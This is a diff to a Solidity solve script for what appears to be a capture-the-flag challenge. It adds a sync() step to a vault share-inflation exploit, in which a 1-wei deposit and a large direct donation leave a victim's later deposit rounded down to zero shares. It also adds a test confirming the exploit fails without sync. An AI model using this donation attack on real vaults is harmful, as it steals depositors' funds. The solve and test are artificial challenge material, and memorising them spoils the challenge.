@@ -1,4 +1,4 @@
-
+// SPDX-License-Identifier: MIT
 pragma solidity 0.8.24;
 
 import "../src/Setup.sol";
@@ -14,9 +14,24 @@ contract Solve {
         token.approve(address(vault), type(uint256).max);
         vault.deposit(1, address(this));
         token.transfer(address(vault), 100 ether);
+        vault.sync();
         setup.victimDeposit();
         vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
 
         require(setup.isSolved(), "not solved");
+    }
+
+    function test_naive_without_sync_fails() external {
+        Setup setup = new Setup(address(this));
+        Token token = setup.token();
+        GenesisVault vault = setup.vault();
+
+        token.approve(address(vault), type(uint256).max);
+        vault.deposit(1, address(this));
+        token.transfer(address(vault), 100 ether);
+        setup.victimDeposit();
+
+        require(vault.balanceOf(setup.victim()) > 0, "trap broken: victim rounded to 0 without sync");
+        require(!setup.isSolved(), "trap broken: solved without sync");
     }
 }
